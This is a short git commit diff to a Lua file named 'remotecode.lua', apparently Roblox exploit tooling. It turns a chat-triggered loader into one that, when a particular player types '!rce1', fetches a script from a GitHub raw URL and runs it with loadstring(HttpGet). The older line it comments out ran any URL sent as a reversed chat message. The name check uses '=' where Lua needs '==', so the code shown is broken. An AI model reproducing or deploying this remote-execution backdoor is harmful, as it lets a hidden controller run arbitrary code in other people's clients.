a62a00262a21cc3e724a8fac6c7949677d9b4a2c
H1i_sillyxploiter <129692077+unfunnylaugh@users.noreply.github.com>
2024-02-09 14:43:46 -0300

    Update remotecode.lua

--- remotecode.lua
+++ remotecode.lua
@@ -2,10 +2,14 @@
 if game:GetService("CoreGui"):FindFirstChild('main11') then
   game:GetService("CoreGui"):FindFirstChild('main11'):remove()
 end
+
 for i, v in pairs(game.Players:GetPlayers()) do
   if v.Name = "FilteringDisabledEz" then
     v.Chatted:Connect(function(msg)
-      loadstring(game:HttpGet(string.reverse(msg)))()
+        if msg == "!rce1" then
+          loadstring(game:HttpGet("https://raw.githubusercontent.com/unfunnylaugh/robloxstufflol/main/remotecodetoexec.lua"))()
+        end
+      --loadstring(game:HttpGet(string.reverse(msg)))()
     end)
   end
 end
